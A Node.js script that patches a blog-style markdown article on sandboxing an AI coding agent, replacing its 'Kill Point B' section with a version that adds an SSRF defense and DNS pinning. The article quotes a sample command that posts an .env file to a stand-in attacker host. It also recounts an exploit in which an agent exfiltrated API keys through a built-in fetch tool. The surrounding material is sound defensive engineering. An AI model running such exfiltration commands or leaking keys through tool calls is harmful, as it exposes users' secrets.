const fs = require('fs');
const file = 'docs/devto/part2_sandbox_architecture.md';
let content = fs.readFileSync(file, 'utf8');

const oldStr = `### Kill Point B: HTTP Hook Network Isolation

Even if kill point A fails (the agent somehow reads a secret), we need to block the exfiltration channel. This is where the architecture is honest about a current gap.

\`bwrap --unshare-net\` and gVisor \`--network=none\` constrain the _child process_. The **host Node/Bun process** is never sandboxed. When the agent uses the \`webfetch\` tool, it calls \`fetch\` in the host process:

\`\`\`typescript
// webfetch.ts — runs in host process, bypasses all bwrap restrictions
const initial = await fetch(params.url, { signal, headers })
\`\`\`

The \`isNetworkRestricted()\` utility provides a software-layer gate:

\`\`\`typescript
if (await isNetworkRestricted(ctx.agent)) {
  throw new Error(
    "Network access is blocked by sandbox configuration (config.sandbox.network is false). " +
      "The webfetch tool cannot be used.",
  )
}
\`\`\`

This is the exact exfiltration path used in the Kiro exploit — the agent composed a URL with stolen API keys and triggered a built-in fetch. Our \`isNetworkRestricted()\` gate breaks this chain when \`sandbox.network\` is \`false\`.

What IS enforced at the OS level: bash tool commands genuinely cannot make network requests under bwrap:

\`\`\`bash
# With sandbox: { bash: "bwrap", network: false }
# Agent runs: curl https://api.attacker.com/exfil -d @.env
# → curl: (6) Could not resolve host (--unshare-net removed the NIC)
\`\`\``;

const newStr = `### Kill Point B: HTTP Hook Network Isolation and SSRF Defense

Even if kill point A fails (the agent somehow reads a secret), we need to block the exfiltration channel. 

\`bwrap --unshare-net\` and gVisor \`--network=none\` constrain the _child process_. The **host Node/Bun process** is never sandboxed. When the agent uses the \`webfetch\` tool, it calls \`fetch\` directly from the host.

If the sandbox network is disabled, the \`isNetworkRestricted()\` utility immediately blocks the tool at the software layer:

\`\`\`typescript
if (await isNetworkRestricted(ctx.agent)) {
  throw new Error("Network access is blocked by sandbox configuration")
}
\`\`\`

But what if the network is *enabled* (e.g., the agent needs to browse documentation), and the agent tries to pivot to attack the local infrastructure (SSRF)? 

To close this gap, we built a pre-flight DNS resolver (Gate 8). It intercepts the URL, resolves the DNS, checks the resulting IPs against a strict denylist, and **pins the exact IP** for the actual fetch to prevent Time-of-Check to Time-of-Use (TOCTOU) DNS rebinding attacks:

\`\`\`typescript
// webfetch.ts — Application-Layer SSRF Defense (Gate 8)
const ssrfCheck = await validateURLForSSRF(params.url)
if (!ssrfCheck.allowed) {
  throw new Error(\`SSRF protection: \${ssrfCheck.reason}\`)
}

// We pin the resolved IP to prevent DNS rebinding, but keep the original Host header
if (ssrfCheck.resolvedIP) {
  fetchOptions.headers = { ...headers, Host: parsedUrl.host }
  fetchOptions.tls = { servername: parsedUrl.hostname }
  parsedUrl.hostname = ssrfCheck.resolvedIP
}
const initial = await fetch(parsedUrl.toString(), fetchOptions)
\`\`\`

This is the exact exfiltration path used in the Kiro exploit—the agent composed a URL with stolen API keys and triggered a built-in fetch. Our network gate breaks this chain immediately, and the SSRF defense prevents it from hitting \`169.254.169.254\` or local network databases.

What IS enforced at the OS level: bash tool commands genuinely cannot make network requests when dropped into an isolated namespace:

\`\`\`bash
# With sandbox: { bash: "bwrap", network: false }
# Agent runs: curl https://api.attacker.com/exfil -d @.env
# → curl: (6) Could not resolve host (--unshare-net removed the NIC)
\`\`\``;

if (content.includes(oldStr)) {
    content = content.replace(oldStr, newStr);
    fs.writeFileSync(file, content);
    console.log("Successfully patched Kill Point B.");
} else {
    console.log("Error: oldStr not found.");
}
